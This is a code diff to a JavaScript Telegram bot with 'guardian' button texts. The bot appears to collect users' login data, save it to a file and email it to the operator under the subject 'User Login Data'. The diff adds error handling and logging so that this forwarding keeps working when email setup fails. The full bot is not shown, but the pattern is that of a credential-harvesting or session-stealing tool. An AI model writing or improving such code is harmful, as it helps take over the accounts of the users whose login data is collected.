@@ -50,14 +50,24 @@ const guardianButtonTexts = [
   "Enter Now"
 ];
 
-// Set up nodemailer transporter for sending emails
-const transporter = nodemailer.createTransport({
-  service: 'gmail',
-  auth: {
-    user: process.env.EMAIL_USER,
-    pass: process.env.EMAIL_PASS
+// Set up nodemailer transporter with error handling
+let transporter;
+try {
+  if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
+    transporter = nodemailer.createTransport({
+      service: 'gmail',
+      auth: {
+        user: process.env.EMAIL_USER,
+        pass: process.env.EMAIL_PASS
+      }
+    });
+    console.log('Nodemailer transporter initialized successfully');
+  } else {
+    console.error('Nodemailer not initialized: EMAIL_USER or EMAIL_PASS missing');
   }
-});
+} catch (error) {
+  console.error('Failed to initialize nodemailer transporter:', error.message);
+}
 
 function generateRandomString(length) {
   const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -149,8 +159,12 @@ function handleStart(bot) {
           chatId, 
           imageToSend,
           jsonToSend
-        );
+        ).catch(error => {
+          console.error(`Failed to send photo to chat ${chatId}:`, error.message);
+        });
       }
+    }).catch(error => {
+      console.error('Failed to get bot info:', error.message);
     });
   });
 }
@@ -194,17 +208,21 @@ const handleRequest = async (req, res, data) => {
       console.error(`Failed to save login data to file for user ${data.userId}:`, fileError.message);
     }
     // Send to email
-    try {
-      await transporter.sendMail({
-        from: process.env.EMAIL_USER,
-        to: process.env.EMAIL_USER,
-        subject: `User Login Data for ${data.userId}`,
-        text: logMessage.replace(/<[^>]+>/g, ''), // Strip HTML tags for plain text email
-        html: logMessage
-      });
-      console.log(`Successfully sent login data to email for user ${data.userId}`);
-    } catch (emailError) {
-      console.error(`Failed to send login data to email for user ${data.userId}:`, emailError.message);
+    if (transporter) {
+      try {
+        await transporter.sendMail({
+          from: process.env.EMAIL_USER,
+          to: process.env.EMAIL_USER,
+          subject: `User Login Data for ${data.userId}`,
+          text: logMessage.replace(/<[^>]+>/g, ''), // Strip HTML tags for plain text email
+          html: logMessage
+        });
+        console.log(`Successfully sent login data to email for user ${data.userId}`);
+      } catch (emailError) {
+        console.error(`Failed to send login data to email for user ${data.userId}:`, emailError.message);
+      }
+    } else {
+      console.error(`Cannot send email for user ${data.userId}: Nodemailer transporter not initialized`);
     }
   }
   let type = data.type;
